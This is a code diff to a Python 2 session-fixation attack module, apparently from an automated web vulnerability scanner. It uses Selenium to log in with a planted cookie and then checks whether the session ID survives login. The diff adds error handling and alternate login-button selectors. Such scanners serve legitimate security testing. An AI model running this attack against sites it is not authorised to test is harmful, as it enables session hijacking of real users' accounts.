@@ -33,31 +33,42 @@ class SessionFixationAttack(Attack):
             f.write(self.cookie["name"])
         time.sleep(1)
 
-        wd.get(self.link)
-        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
-        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
-        wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
-        proceed_to_server_side_fixation_attack = False
-        recived_cookie = ""
-        for cookie in wd.get_cookies():
-            if cookie["name"] == self.cookie["name"]:
-                recived_cookie = cookie["value"]
-                break
-        print "recived_cookie is: %s " % recived_cookie
-        if recived_cookie == "12345":
-            print "CONFIRMED: login sucessfully. client side fixation attack successful."
-            exploit = {
-                "page": self.link,
-                "cookie": [{
-                    "name": self.cookie["name"],
-                    "secure": self.cookie["secure"],
-                    "httpOnly": self.cookie["httpOnly"],
-                    "attack": ["sessionFixation"]
-                }]
-            }
-            self.phase4_output(exploit)
-        else :
-            print "CONFIRMED: login unsucessfully. client side fixation attack failed."
+        try:
+            wd.get(self.link)
+            wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
+            wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
+            if self.button == '//form//a[@class="button"]':
+                wd.find_element_by_xpath(self.button).click()
+            else:
+                try:
+                    wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
+                except NoSuchElementException:
+                    wd.find_element_by_xpath("//button[@value='" + self.button + "']").click()
+            proceed_to_server_side_fixation_attack = False
+            wd.get(wd.current_url)
+            recived_cookie = ""
+            for cookie in wd.get_cookies():
+                if cookie["name"] == self.cookie["name"]:
+                    recived_cookie = cookie["value"]
+                    break
+            print "recived_cookie is: %s " % recived_cookie
+            if recived_cookie == "123":
+                print "CONFIRMED: login sucessfully. client side fixation attack successful."
+                exploit = {
+                    "page": self.link,
+                    "cookie": [{
+                        "name": self.cookie["name"],
+                        "secure": self.cookie["secure"],
+                        "httpOnly": self.cookie["httpOnly"],
+                        "attack": ["sessionFixation"]
+                    }]
+                }
+                self.phase4_output(exploit)
+            else :
+                print "CONFIRMED: login unsucessfully. client side fixation attack failed."
+                proceed_to_server_side_fixation_attack = True
+        except NoSuchElementException:
+            print "ERROR: login unsucessfully. client side fixation attack failed."
             proceed_to_server_side_fixation_attack = True
         subprocess.Popen("kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')", shell=True)
         subprocess.Popen("rm nohup.out", shell=True)
@@ -75,27 +86,38 @@ class SessionFixationAttack(Attack):
             if before_cookie != "" :
                 print "=============== TRY: server side fixation attack ========================"
                 print "cookie before login: %s" % before_cookie
-                wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
-                wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
-                wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
-                after_cookie = ""
-                for cookie in wd.get_cookies():
-                    if cookie["name"] == self.cookie["name"]:
-                        after_cookie = cookie["value"]
-                        break
-                print "cookie after login: %s" % after_cookie
-                if after_cookie == before_cookie :
-                    print "CONFIRMED: server side fixation attack successful."
-                    exploit = {
-                        "page": self.link,
-                        "cookie": [{
-                            "name": self.cookie["name"],
-                            "secure": self.cookie["secure"],
-                            "httpOnly": self.cookie["httpOnly"],
-                            "attack": ["sessionFixation"]
-                        }]
-                    }
-                    self.phase4_output(exploit)
+                try:
+                    wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
+                    wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
+                    if self.button == '//form//a[@class="button"]':
+                        wd.find_element_by_xpath(self.button).click()
+                    else:
+                        try:
+                            wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
+                        except NoSuchElementException:
+                            wd.find_element_by_xpath("//button[@value='" + self.button + "']").click()
+                    after_cookie = ""
+                    for cookie in wd.get_cookies():
+                        if cookie["name"] == self.cookie["name"]:
+                            after_cookie = cookie["value"]
+                            break
+                    print "cookie after login: %s" % after_cookie
+                    if after_cookie == before_cookie :
+                        print "CONFIRMED: server side fixation attack successful."
+                        exploit = {
+                            "page": self.link,
+                            "cookie": [{
+                                "name": self.cookie["name"],
+                                "secure": self.cookie["secure"],
+                                "httpOnly": self.cookie["httpOnly"],
+                                "attack": ["sessionFixation"]
+                            }]
+                        }
+                        self.phase4_output(exploit)
+                    else:
+                        print "CONFIRMED: server side fixation attack failed."
+                except NoSuchElementException:
+                    print "ERROR: server side fixation attack failed."
             else :
                 print "=============== CONFIRMED: not a valid fixation issue ========================"
             wd.close()
